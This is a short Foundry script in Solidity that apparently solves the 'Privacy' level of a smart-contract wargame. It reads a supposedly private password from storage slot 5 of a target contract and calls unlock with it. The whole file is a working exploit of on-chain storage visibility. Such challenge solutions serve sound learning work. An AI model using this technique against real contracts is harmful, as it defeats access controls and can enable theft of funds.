// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Privacy} from "src/Privacy.sol";
import {console} from "forge-std/console.sol";

contract PrivacySolution is Script {
    Privacy public privacyInstance = Privacy(0x9C84deC21cd73b1dc17d5F307e91DDf0f4238aC6);
    uint256 slot = 5;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 value = vm.load(address(privacyInstance), bytes32(slot));
        console.logBytes32(value);
        privacyInstance.unlock(bytes16(value));
        console.log("locked:", privacyInstance.locked());
        vm.stopBroadcast();
    }
}
